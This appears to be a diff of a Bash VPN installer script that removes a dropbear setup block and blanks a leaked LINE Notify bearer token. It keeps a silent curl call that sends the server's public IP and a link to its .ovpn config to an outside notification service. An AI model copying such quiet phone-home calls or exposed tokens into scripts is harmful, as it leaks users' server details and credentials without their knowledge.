@@ -38,9 +38,7 @@ if [[ $(id -g) != "0" ]] ; then
     des "❯❯❯ สคริปต์ต้องทำงานเป็น root."
 fi
 
-#if [[  ! -e /dev/net/tun ]] ; then
-   # des "❯❯❯ TUN/TAP อุปกรณ์ไม่พร้อมใช้งาน."
-#fi
+
 
 dpkg -l openvpn > /dev/null 2>&1
 if [[ $? -eq 0 ]]; then
@@ -314,16 +312,7 @@ ok "❯❯❯ service php restart"
 service php7.0-fpm restart > /dev/null 2>&1
 fi
 
-# install dropbear
-die "❯❯❯ apt-get install dropbear"
-apt-get install -qy dropbear > /dev/null 2>&1
-sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=446/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 110"/g' /etc/default/dropbear
-echo "/bin/false" >> /etc/shells
-echo "/usr/sbin/nologin" >> /etc/shells
-ok "❯❯❯ service dropbear restart"
-service dropbear restart > /dev/null 2>&1
+
 
 #detail nama perusahaan
 country=ID
@@ -423,7 +412,7 @@ service openvpn restart -q > /dev/null 2>&1
 
 #แจ้งเตือนคนรันสคิป
 IP=$(wget -qO- ipv4.icanhazip.com);
-curl -X POST -H 'Authorization: Bearer RSEzjR0dYrnlIGASIopAcT8Ph4uNkm9PYCbcoFTm0Zm' -F 'message='" 
+curl -X POST -H 'Authorization: Bearer ' -F 'message='" 
 Load_file  $IP/KGUZA.ovpn "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
 
 echo "ติดตั้งเสร็จเรียบร้อย" > /usr/bin/install_full
